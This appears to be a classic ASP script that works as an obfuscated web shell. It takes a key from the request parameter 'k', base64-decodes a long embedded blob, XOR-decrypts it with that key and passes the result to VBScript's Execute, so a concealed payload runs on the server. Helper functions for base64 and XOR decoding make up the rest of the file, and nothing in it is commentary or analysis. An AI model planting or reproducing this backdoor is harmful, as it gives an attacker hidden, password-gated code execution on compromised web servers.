<%
k = Request("k")
e = decode("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")

Execute(DeCrypt(e,k))


Function DeCrypt(strEncrypted, key)
Dim strChar, iKeyChar, iStringChar, i
  for i = 1 to Len(strEncrypted)
    if i Mod Len(key) = 0 then
      iKeyChar = asc(Right(key,1))
    Else
      iKeyChar = asc(mid(key,i Mod Len(key),1))
    end if
    iStringChar = asc(mid(strEncrypted,i,1))
    iDeCryptChar =  iStringChar Xor iKeyChar
    strDecrypted =  strDecrypted & Chr(iDeCryptChar)
  next
  DeCrypt = strDecrypted
End Function

Function XORIt(ByVal Text, ByVal key)
    request.write Text
    request.write key
    Dim l
    Dim lonLenKey, lonKeyPos
    lonLenKey = Len(key)
    For l = 1 To Len(Text)
        lonKeyPos = lonKeyPos + 1
        If lonKeyPos > lonLenKey Then lonKeyPos = 1
        Mid(Text, l, 1) = Chr(Mid(Text, l, 1) Xor Mid(key, lonKeyPos, 1))
    Next
    XORIt = Text
End Function

Function Base64Decode(ByVal vCode)
  Dim oXML, oNode
  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
  Set oNode = oXML.CreateElement("base64")
  oNode.dataType = "bin.base64"
  oNode.text = vCode
  Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
  Set oNode = Nothing
  Set oXML = Nothing
End Function
Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.Write Binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "us-ascii"
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function

Function decode( byVal strIn )
		Dim w1, w2, w3, w4, n, strOut
		For n = 1 To Len( strIn ) Step 4
			w1 = mimedecode( Mid( strIn, n, 1 ) )
			w2 = mimedecode( Mid( strIn, n + 1, 1 ) )
			w3 = mimedecode( Mid( strIn, n + 2, 1 ) )
			w4 = mimedecode( Mid( strIn, n + 3, 1 ) )
			If w2 >= 0 Then _
				strOut = strOut + _
					Chr( ( ( w1 * 4 + Int( w2 / 16 ) ) And 255 ) )
			If w3 >= 0 Then _
				strOut = strOut + _
					Chr( ( ( w2 * 16 + Int( w3 / 4 ) ) And 255 ) )
			If w4 >= 0 Then _
				strOut = strOut + _
					Chr( ( ( w3 * 64 + w4 ) And 255 ) )
		Next
		decode = strOut
	End Function

  Private Function mimedecode( byVal strIn )
    Dim Base64Chars
    Base64Chars =	"ABCDEFGHIJKLMNOPQRSTUVWXYZ" & _
        "abcdefghijklmnopqrstuvwxyz" & _
        "0123456789" & _
        "+/"
		If Len( strIn ) = 0 Then 
			mimedecode = -1 : Exit Function
		Else
			mimedecode = InStr( Base64Chars, strIn ) - 1
		End If
	End Function
%>
